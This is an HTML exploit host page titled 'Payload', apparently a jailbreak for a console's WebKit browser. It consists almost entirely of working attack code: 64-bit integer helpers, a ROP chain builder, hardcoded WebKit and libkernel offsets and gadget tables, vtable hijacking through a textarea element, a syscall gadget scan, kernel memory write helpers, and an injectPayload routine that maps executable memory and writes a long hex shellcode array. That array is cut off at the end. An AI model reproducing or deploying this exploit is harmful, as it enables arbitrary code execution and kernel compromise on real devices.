<!DOCTYPE html><html>
<head>
<title>Payload</title>
<meta name=viewport content="width=device-width, initial-scale=1">
<style>body{color:white;font-size:20px;text-align:center;margin:0;overflow:hidden;}.info{overflow: hidden;position: fixed;position: absolute;top: 45%;left: 50%;font-size: 25px;font-family: sans-serif;color: #b8b8b8;transform: translate(-50%, -50%);}</style>
<script>

function ghdone() 
{document.getElementById("loader").style.display = "none";
document.getElementById("done").style.display = "block";
}
</script>
<script>
// Taken from https://github.com/saelo/jscpwn/blob/master/int64.js
//
// Copyright (c) 2016 Samuel GroÃŸ
function int64(low, hi) {
    this.low = (low >>> 0);
    this.hi = (hi >>> 0);

    this.add32inplace = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.add32 = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        return new int64(new_lo, new_hi);
    }

    this.sub32 = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        return new int64(new_lo, new_hi);
    }

    this.add64 = function(val) {
        var new_lo = (((this.low >>> 0) + val.low) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi++;
        }
        new_hi = (((new_hi >>> 0) + val.hi) & 0xFFFFFFFF) >>> 0;
        return new int64(new_lo, new_hi);
    }
    this.sub64 = function(val) {
        var new_lo = (((this.low >>> 0) - val.low) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }
        new_hi = (((new_hi >>> 0) - val.hi) & 0xFFFFFFFF) >>> 0;
        return new int64(new_lo, new_hi);
    }

    this.sub32inplace = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.and32 = function (val) {
        var new_lo = this.low & val;
        var new_hi = this.hi;
        return new int64(new_lo, new_hi);
    }

    this.and64 = function (vallo, valhi) {
        var new_lo = this.low & vallo;
        var new_hi = this.hi & valhi;
        return new int64(new_lo, new_hi);
    }

    this.toString = function (val) {
        val = 16;
        var lo_str = (this.low >>> 0).toString(val);
        var hi_str = (this.hi >>> 0).toString(val);

        if (this.hi == 0)
            return lo_str;
        else
            lo_str = zeroFill(lo_str, 8)

        return hi_str + lo_str;
    }

    this.toPacked = function () {
        return {
            hi: this.hi,
            low: this.low
        };
    }

    this.setPacked = function (pck) {
        this.hi = pck.hi;
        this.low = pck.low;
        return this;
    }

    return this;
}

function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0) {
        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
    }

    return number + ""; // always return a string
}
function Int64(low, high) {
    var bytes = new Uint8Array(8);

    if (arguments.length > 2 || arguments.length == 0)
        throw TypeError("Incorrect number of arguments to constructor");
    if (arguments.length == 2) {
        if (typeof low != 'number' || typeof high != 'number') {
            throw TypeError("Both arguments must be numbers");
        }
        if (low > 0xffffffff || high > 0xffffffff || low < 0 || high < 0) {
            throw RangeError("Both arguments must fit inside a uint32");
        }
        low = low.toString(16);
        for (let i = 0; i < 8 - low.length; i++) {
            low = "0" + low;
        }
        low = "0x" + high.toString(16) + low;
    }

    switch (typeof low) {
        case 'number':
            low = '0x' + Math.floor(low).toString(16);
        case 'string':
            if (low.substr(0, 2) === "0x")
                low = low.substr(2);
            if (low.length % 2 == 1)
                low = '0' + low;
            var bigEndian = unhexlify(low, 8);
            var arr = [];
            for (var i = 0; i < bigEndian.length; i++) {
                arr[i] = bigEndian[i];
            }
            bytes.set(arr.reverse());
            break;
        case 'object':
            if (low instanceof Int64) {
                bytes.set(low.bytes());
            } else {
                if (low.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(low);
            }
            break;
        case 'undefined':
            break;
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function () {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    this.asInteger = function () {
        if (bytes[7] != 0 || bytes[6] > 0x20) {
            debug_log("SOMETHING BAD HAS HAPPENED!!!");
            throw new RangeError(
                "Can not be represented as a regular number");
        }
        return Struct.unpack(Struct.int64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function () {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[
            6] == 0xff))
            throw new RangeError(
                "Can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        return Struct.unpack(Struct.float64, this.sub(0x1000000000000).bytes());
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function () {
        var arr = [];
        for (var i = 0; i < bytes.length; i++) {
            arr.push(bytes[i])
        }
        return arr;
    };

    // Return the byte at the given index.
    this.byteAt = function (i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function () {
        var arr = [];
        for (var i = 0; i < bytes.length; i++) {
            arr.push(bytes[i])
        }
        return '0x' + hexlify(arr.reverse());
    };

    this.low32 = function () {
        return new Uint32Array(bytes.buffer)[0] >>> 0;
    };

    this.hi32 = function () {
        return new Uint32Array(bytes.buffer)[1] >>> 0;
    };

    this.equals = function (other) {
        if (!(other instanceof Int64)) {
            other = new Int64(other);
        }
        for (var i = 0; i < 8; i++) {
            if (bytes[i] != other.byteAt(i))
                return false;
        }
        return true;
    };

    this.greater = function (other) {
        if (!(other instanceof Int64)) {
            other = new Int64(other);
        }
        if (this.hi32() > other.hi32())
            return true;
        else if (this.hi32() === other.hi32()) {
            if (this.low32() > other.low32())
                return true;
        }
        return false;
    };
    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function () {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            var new_args = [];
            for (var i = 0; i < arguments.length; i++) {
                if (!(arguments[i] instanceof Int64)) {
                    new_args[i] = new Int64(arguments[i]);
                } else {
                    new_args[i] = arguments[i];
                }
            }
            return f.apply(this, new_args);
        };
    }

    this.neg = operation(function neg() {
        var ret = [];
        for (var i = 0; i < 8; i++)
            ret[i] = ~this.byteAt(i);
        return new Int64(ret).add(Int64.One);
    }, 0);

    this.add = operation(function add(a) {
        var ret = [];
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = this.byteAt(i) + a.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            ret[i] = cur;
        }
        return new Int64(ret);
    }, 1);

    this.assignAdd = operation(function assignAdd(a) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = this.byteAt(i) + a.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 1);


    this.sub = operation(function sub(a) {
        var ret = [];
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = this.byteAt(i) - a.byteAt(i) - carry;
            carry = cur < 0 | 0;
            ret[i] = cur;
        }
        return new Int64(ret);
    }, 1);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function (d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);
Int64.NegativeOne = new Int64(0xffffffff, 0xffffffff);
</script>
<script>
const stack_sz = 0x40000;
const reserve_upper_stack = 0x8000;
const stack_reserved_idx = reserve_upper_stack / 4;


// Class for quickly creating and managing a ROP chain
window.rop = function () {
    this.stackback = p.malloc32(stack_sz / 4 + 0x8);
    this.stack = this.stackback.add32(reserve_upper_stack);
    this.stack_array = this.stackback.backing;
    this.retval = this.stackback.add32(stack_sz);
    this.count = 1;
    this.branches_count = 0;
    this.branches_rsps = p.malloc(0x200);

    this.clear = function () {
        this.count = 1;
        this.branches_count = 0;

        for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
            this.stack_array[i + stack_reserved_idx] = 0;
        }
    };

    this.pushSymbolic = function () {
        this.count++;
        return this.count - 1;
    }

    this.finalizeSymbolic = function (idx, val) {
        if (val instanceof int64) {
            this.stack_array[stack_reserved_idx + idx * 2] = val.low;
            this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
        } else {
            this.stack_array[stack_reserved_idx + idx * 2] = val;
            this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
        }
    }

    this.push = function (val) {
        this.finalizeSymbolic(this.pushSymbolic(), val);
    }

    this.push_write8 = function (where, what) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["pop rsi"]);
        this.push(what);
        this.push(gadgets["mov [rdi], rsi"]);
    }

    this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        if (rdi != undefined) {
            this.push(gadgets["pop rdi"]);
            this.push(rdi);
        }

        if (rsi != undefined) {
            this.push(gadgets["pop rsi"]);
            this.push(rsi);
        }

        if (rdx != undefined) {
            this.push(gadgets["pop rdx"]);
            this.push(rdx);
        }

        if (rcx != undefined) {
            this.push(gadgets["pop rcx"]);
            this.push(rcx);
        }

        if (r8 != undefined) {
            this.push(gadgets["pop r8"]);
            this.push(r8);
        }

        if (r9 != undefined) {
            this.push(gadgets["pop r9"]);
            this.push(r9);
        }

        this.push(rip);
        return this;
    }

    this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
        this.write_result(this.retval);
        this.run();
        return p.read8(this.retval);
    }

    this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
        return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
    }

    //get rsp of the next push
    this.get_rsp = function () {
        return this.stack.add32(this.count * 8);
    }
    this.write_result = function (where) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["mov [rdi], rax"]);
    }
    this.write_result4 = function (where) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["mov [rdi], eax"]);
    }

    this.jmp_rsp = function (rsp) {
        this.push(window.gadgets["pop rsp"]);
        this.push(rsp);
    }

    this.run = function () {
        p.launch_chain(this);
        this.clear();
    }

    this.KERNEL_BASE_PTR_VAR;
    this.set_kernel_var = function (arg) {
        this.KERNEL_BASE_PTR_VAR = arg;
    }

    this.rax_kernel = function (offset) {
        this.push(gadgets["pop rax"]);
        this.push(this.KERNEL_BASE_PTR_VAR)
        this.push(gadgets["mov rax, [rax]"]);
        this.push(gadgets["pop rsi"]);
        this.push(offset)
        this.push(gadgets["add rax, rsi"]);
    }

    this.write_kernel_addr_to_chain_later = function (offset) {
        this.push(gadgets["pop rdi"]);
        var idx = this.pushSymbolic();
        this.rax_kernel(offset);
        this.push(gadgets["mov [rdi], rax"]);
        return idx;
    }

    this.kwrite8 = function (offset, qword) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rsi"]);
        this.push(qword);
        this.push(gadgets["mov [rax], rsi"]);
    }
    this.kwrite4 = function (offset, dword) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rdx"]);
        this.push(dword);
        this.push(gadgets["mov [rax], edx"]);
    }

    this.kwrite8_kaddr = function (offset1, offset2) {
        this.rax_kernel(offset2);
        this.push(gadgets["mov rdx, rax"]);
        this.rax_kernel(offset1);
        this.push(gadgets["mov [rax], rdx"]);
    }
    return this;
};
</script>

<script>
var chain;
var kchain;
var kchain2;
var SAVED_KERNEL_STACK_PTR;
var KERNEL_BASE_PTR;

var webKitBase;
var webKitRequirementBase;

var libSceLibcInternalBase;
var libKernelBase;

var textArea = document.createElement("textarea");

const OFFSET_wk_vtable_first_element = 0x104F110;
const OFFSET_WK_memset_import = 0x000002A8;
const OFFSET_WK___stack_chk_fail_import = 0x00000178;
const OFFSET_WK_psl_builtin_import = 0xD68;

const OFFSET_WKR_psl_builtin = 0x33BA0;

const OFFSET_WK_setjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_setjmp_gadget_two = 0x01ECE1D3;
const OFFSET_WK_longjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_longjmp_gadget_two = 0x01ECE1D3;

const OFFSET_libcint_memset = 0x0004F810;
const OFFSET_libcint_setjmp = 0x000BB5BC;
const OFFSET_libcint_longjmp = 0x000BB616;

const OFFSET_WK2_TLS_IMAGE = 0x38e8020;


const OFFSET_lk___stack_chk_fail = 0x0001FF60;
const OFFSET_lk_pthread_create = 0x00025510;
const OFFSET_lk_pthread_join = 0x0000AFA0;

var nogc = [];
var syscalls = {};
var gadgets = {};
var wk_gadgetmap = {
    "ret": 0x32,
    "pop rdi": 0x319690,
    "pop rsi": 0x1F4D6,
    "pop rdx": 0x986C,
    "pop rcx": 0x657B7,
    "pop r8": 0xAFAA71,
    "pop r9": 0x422571,
    "pop rax": 0x51A12,
    "pop rsp": 0x4E293,

    "mov [rdi], rsi": 0x1A97920,
    "mov [rdi], rax": 0x10788F7,
    "mov [rdi], eax": 0x9964BC,

    "cli ; pop rax": 0x566F8,
    "sti": 0x1FBBCC,

    "mov rax, [rax]": 0x241CC,
    "mov rax, [rsi]": 0x5106A0,
    "mov [rax], rsi": 0x1EFD890,
    "mov [rax], rdx": 0x1426A82,
    "mov [rax], edx": 0x3B7FE4,
    "add rax, rsi": 0x170397E,
    "mov rdx, rax": 0x53F501,
    "add rax, rcx": 0x2FBCD,
    "mov rsp, rdi": 0x2048062,
    "mov rdi, [rax + 8] ; call [rax]": 0x751EE7,
    "infloop": 0x7DFF
};

var wkr_gadgetmap = {
    "xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0 //JOP 3
};

var wk2_gadgetmap = {
    "mov [rax], rdi": 0xFFDD7,
    "mov [rax], rcx": 0x2C9ECA,
};
var hmd_gadgetmap = {
    "add [r8], r12": 0x2BCE1
};
var ipmi_gadgetmap = {
    "mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B
};

function userland() {

    p.launch_chain = launch_chain;
    p.malloc = malloc;
    p.malloc32 = malloc32;
    p.stringify = stringify;
    p.array_from_address = array_from_address;
    p.readstr = readstr;

    var textAreaAddr = p.leakval(textArea);
    var textAreVtablePtrPtr = textAreaAddr.add32(0x18);
    var textAreaVtPtr = p.read8(textAreVtablePtrPtr);

    //pointer to vtable address
    var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    //address of vtable
    var textAreaVtable = p.read8(textAreaVtPtr);
    //use address of 1st entry (in .text) to calculate webkitbase
    webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);

    libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
    libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);

    libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

    webKitRequirementBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));
    webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);

    for (var gadget in wk_gadgetmap) {
        window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (var gadget in wkr_gadgetmap) {
        window.gadgets[gadget] = webKitRequirementBase.add32(wkr_gadgetmap[gadget]);
    }

    function get_jmptgt(address) {
        var instr = p.read4(address) & 0xFFFF;
        var offset = p.read4(address.add32(2));
        if (instr != 0x25FF) {
            return 0;
        }
        return address.add32(0x6 + offset);
    }

    function malloc(sz) {
        var backing = new Uint8Array(0x10000 + sz);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc32(sz) {
        var backing = new Uint8Array(0x10000 + sz * 4);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = new Uint32Array(backing.buffer);
        return ptr;
    }

    function array_from_address(addr, size) {
        var og_array = new Uint32Array(0x1000);
        var og_array_i = p.leakval(og_array).add32(0x10);

        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(8), size);

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        var bufView = new Uint8Array(str.length + 1);
        for (var i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        window.nogc.push(bufView);
        return p.read8(p.leakval(bufView).add32(0x10));
    }

    function readstr(addr) {
        var str = "";
        for (var i = 0;; i++) {
            var c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    function array_from_address(addr, size) {
        var og_array = new Uint32Array(0x1000);
        var og_array_i = p.leakval(og_array).add32(0x10);

        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(8), size);

        nogc.push(og_array);
        return og_array;
    }

    var fakeVtable_setjmp = p.malloc32(0x200);
    var fakeVtable_longjmp = p.malloc32(0x200);
    var original_context = p.malloc32(0x40);
    var modified_context = p.malloc32(0x40);

    p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
    p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
    p.write8(fakeVtable_setjmp.add32(0x10), original_context);
    p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
    p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

    p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
    p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
    p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
    p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
    p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

    function launch_chain(chain) {
        chain.push(window.gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

        p.write8(textAreaVtPtr, fakeVtable_setjmp);
        textArea.scrollLeft = 0x0;
        p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
        p.write8(modified_context.add32(0x10), chain.stack);
        p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))

        p.write8(textAreaVtPtr, fakeVtable_longjmp);
        textArea.scrollLeft = 0x0;
        p.write8(textAreaVtPtr, textAreaVtable);
    }

    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(0x10);
    var orig_kview_buf = p.read8(kstr);

    p.write8(kstr, window.libKernelBase);
    p.write4(kstr.add32(8), 0x40000);
    var countbytes;

    for (var i = 0; i < 0x40000; i++) {
        if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
            countbytes = i;
            break;
        }
    }
    p.write4(kstr.add32(8), countbytes + 32);
    var dview32 = new Uint32Array(1);
    var dview8 = new Uint8Array(dview32.buffer);
    for (var i = 0; i < countbytes; i++) {
        if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
            dview8[0] = kview[i + 3];
            dview8[1] = kview[i + 4];
            dview8[2] = kview[i + 5];
            dview8[3] = kview[i + 6];
            var syscallno = dview32[0];
            window.syscalls[syscallno] = window.libKernelBase.add32(i);
        }
    }
    p.write8(kstr, orig_kview_buf);

    chain = new rop();
}


function injectPayload() //single payload inject for both conditions/removed need for binloader/netcat etc - stooged
{
	var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
	var payload=[0X000000e9,0X41574100,0X41554156,0X48535554,0X0f88ec81,0Xa2e80000,0X4c000016,0X1024648d,0X24bc8d4c,0X0000037d,0X001070e8,0X48c03100,0X51246c8d,0X000caee8,0X0e29e800,0Xd2310000,0X000010b9,0X0010be00,0X894c0000,0X0ffee8e7,0X8d480000,0X00242f1d,0X7c8d4800,0X8d485124,0X001b1635,0X0026b900,0X84c70000,0X00035024,0X00000000,0X2484c700,0X00000378,0X00000000,0X24ac8d4c,0X0000077d,0X7c2484c6,0X01000003,0Xc7ea8948,0X03602484,0Xffff0000,0Xc031ffff,0X24b48d4c,0X00000150,0X00bea4f3,0X4c000004,0X13ffef89,0Xd5158d48,0Xbe000019,0X00000400,0X31ff894c,0X3113ffc0,0Xbc8d48c0,0X00015824,0X007eb900,0Xc7480000,0X01502484,0X00000000,0X8d480000,0X0019bf15,0X0200be00,0Xabf30000,0X4cf9894c,0X13fff789,0X59bfc931,0X89000002,0X4c082444,0Xc031f289,0X000007be,0X1950e800,0X8d480000,0X00228f05,0X48388b00,0X5824848d,0X48000001,0X85240489,0X441078ff,0X0824448b,0X44f6894c,0X4de8c289,0X48000015,0X264e058d,0Xc9310000,0X8d48ff31,0X035024b4,0X30ba0000,0Xff00000c,0Xe7894c10,0X000e27e8,0X0fc08500,0X00032585,0X448d4800,0X89482024,0X8b452404,0X8d412404,0Xf8830140,0Xf8860f01,0X31000002,0X7c8d48c0,0Xf7b95924,0X48000000,0X512444c7,0X00000000,0X21158d48,0Xbe000019,0X000000ff,0X8944aaf3,0Xef8948c1,0X894813ff,0X0c72e8ef,0Xc0850000,0X00c3850f,0X89480000,0X0c81e8ef,0Xc0850000,0X0fc68941,0X0000b085,0X01ffbe00,0X89480000,0X0beae8ef,0X8d480000,0Xb92b247c,0X00000026,0X90358d48,0Xc7000019,0X03502484,0X00000000,0X84c70000,0X00037824,0X00000000,0X548d4800,0X84c62b24,0X00037c24,0Xc0310100,0X602484c7,0Xff000003,0X4cffffff,0X7d24bc8d,0Xf3000003,0X0400bea4,0X894c0000,0X4c13ffef,0X8b410b8b,0X894c243c,0Xe808244c,0X00000d87,0X244c8b4c,0Xff894c08,0X48c18948,0X1892158d,0X00be0000,0X31000004,0Xd1ff41c0,0X2484c748,0X00000150,0X00000000,0X24bc8d48,0X00000158,0X00007eb9,0Xf0894400,0X0000aee9,0Xef894800,0X000bbee8,0Xef894800,0X8941c085,0Xb9840fc6,0Xe8000000,0X00000b38,0X247c8d48,0X0026b92b,0X8d480000,0X0018d235,0X2484c700,0X00000350,0X00000000,0X782484c7,0X00000003,0X48000000,0X2b24548d,0X7c2484c6,0X01000003,0X84c7c031,0X00036024,0Xffffff00,0Xbc8d4cff,0X00037d24,0Xbea4f300,0X00000400,0Xffef894c,0X3c8b4113,0X338b4c24,0X000ccee8,0Xff894c00,0X1f158d48,0X48000018,0X00bec189,0X31000004,0Xd6ff41c0,0X2484c748,0X00000150,0X00000000,0X24bc8d48,0X00000158,0X00007eb9,0X4cc03100,0X5024b48d,0X48000001,0X176e158d,0Xabf30000,0X000200be,0Xf9894c00,0Xe9f7894c,0X000000de,0X000ad3e8,0X0fc08500,0X00011e84,0Xef894800,0X24bc8d4c,0X0000037d,0X0009e3e8,0X01ffbe00,0X89480000,0X0a4ee8ef,0X8d480000,0Xb92b247c,0X00000026,0Xf4358d48,0Xc7000017,0X03502484,0X00000000,0X84c70000,0X00037824,0X00000000,0X548d4800,0X84c62b24,0X00037c24,0Xc0310100,0X602484c7,0Xff000003,0Xf3ffffff,0X0400bea4,0X894c0000,0X4c13ffef,0X8b410b8b,0X894c243c,0Xe808244c,0X00000bf3,0X244c8b4c,0X158d4808,0X00001704,0Xbec18948,0X00000400,0X31ff894c,0Xd1ff41c0,0X48f08944,0X5824bc8d,0Xb9000001,0X0000007e,0X24b48d4c,0X00000150,0X2484c748,0X00000150,0X00000000,0X8d158d48,0Xbe000016,0X00000200,0X894cabf3,0Xf7894cf9,0X13ffc031,0X59bfc931,0X41000002,0X894cc789,0Xbec031f2,0X00000007,0X00161de8,0X058d4800,0X00001f5c,0Xff85388b,0X89440b78,0Xf6894cfa,0X00122be8,0X058d4800,0X0000232c,0X24b48d48,0X00000350,0X30bac931,0X3100000c,0X4910ffff,0X4c04c483,0X0f24243b,0Xfffce985,0X00d6e9ff,0X26b90000,0X48000000,0X8d48ef89,0X0016e235,0X2484c700,0X00000350,0X00000000,0X782484c7,0X00000003,0X48000000,0X5124548d,0X7c2484c6,0X01000003,0X84c7c031,0X00036024,0Xffffff00,0Xbea4f3ff,0X00000400,0Xffef894c,0X158d4813,0X00001684,0X000400be,0Xff894c00,0X13ffc031,0X243c8b48,0X7eb9c031,0X48000000,0X502484c7,0X00000001,0X48000000,0X15a2158d,0X00be0000,0Xf3000002,0Xf9894cab,0Xfff7894c,0Xbfc93113,0X00000259,0X4cc48941,0Xc031f289,0X000007be,0X1534e800,0X8d480000,0X001e7305,0X85388b00,0X440b78ff,0X894ce289,0X1142e8f6,0X8d480000,0X00224305,0Xb48d4800,0X00035024,0Xbac93100,0X00000c30,0X10ffff31,0X88c48148,0X3100000f,0X415d5bc0,0X415d415c,0Xc35f415e,0X08478b48,0X4cf18949,0X4848408b,0X4940708b,0X6608418b,0X3d66008b,0X840f022b,0X000003ac,0X0108870f,0X3d660000,0X870f01da,0X000000b4,0X01d53d66,0X3d664e77,0X870f0197,0X0000008b,0X018f3d66,0X3d666477,0X840f0163,0X00000201,0X01723d66,0X0217840f,0X3d660000,0X850f015e,0X0000047c,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0Xb53f3088,0X30054800,0Xe9015c15,0X000004d6,0X01d72d66,0X03f88366,0X029f870f,0X8d480000,0X0015ab15,0Xc0b70f00,0X82046348,0X000082b9,0Xd00148c0,0X2d66e0ff,0X83660190,0X870f07f8,0X00000428,0X95158d48,0X0f000015,0X6348c0b7,0X01488204,0X66e0ffd0,0X0f01c23d,0X00023c84,0Xc73d6600,0X32840f01,0Xe9000002,0X000003fc,0X01fb3d66,0X3d662b77,0X860f01f3,0X000003ec,0X01f42d66,0X07f88366,0X03de870f,0X8d480000,0X00156b15,0Xc0b70f00,0X82046348,0Xffd00148,0X263d66e0,0X8d840f02,0X66000002,0X0f02293d,0X00028384,0X03b2e900,0X3d660000,0X840f02bd,0X0000032b,0X3d667e77,0X840f028b,0X000002e8,0X3d663e77,0X840f025a,0X0000029c,0X3d661977,0X840f022c,0X00000270,0X02583d66,0X0286840f,0X75e90000,0X66000003,0X0f026c3d,0X00029784,0X8a3d6600,0Xad840f02,0Xe9000002,0X0000035c,0X02a03d66,0X02b5840f,0X19770000,0X029e3d66,0X02a9840f,0X3d660000,0X840f029f,0X0000029f,0X000337e9,0Xbc3d6600,0Xb0840f02,0Xe9000002,0X00000328,0X03213d66,0X02e1840f,0X3e770000,0X02ef3d66,0X02b5840f,0X19770000,0X02be3d66,0X0289840f,0X3d660000,0X840f02ee,0X0000029f,0X0002f7e9,0Xf33d6600,0X90840f02,0X66000002,0X0f03203d,0X0002a684,0X02dee900,0X3d660000,0X840f0354,0X000002b7,0X3d661977,0X840f0323,0X0000028b,0X03523d66,0X02a1840f,0Xb9e90000,0X66000002,0X0f03843d,0X0002af85,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0Xf6b0888d,0X05480111,0X021efd60,0X000309e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0X3af0888d,0X054800b5,0X015c1130,0X0002e9e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0Xcf10888d,0X054800b5,0X015cd040,0X0002c9e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0X7610888d,0X054800c1,0X01d5e850,0X0002a9e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0X74e0888d,0X054800c1,0X01d5e720,0X000289e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0X74d0888d,0X054800c1,0X01d5e710,0X000269e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0Xb4d0888d,0X054800c1,0X01d62710,0X000249e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0X03e0888d,0X054800d3,0X01ea6460,0X000229e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0X7270888d,0X054800d3,0X01ead1a0,0X000209e9,0X48320f00,0X4820e2c1,0X8d48d009,0Xd372e088,0X10054800,0Xe901ead2,0X000001ee,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0X0984e088,0X30054801,0Xe9022c18,0X000001ce,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0X0984e088,0Xb0054801,0Xe9022c18,0X000001ae,0X000082b9,0X48320fc0,0X4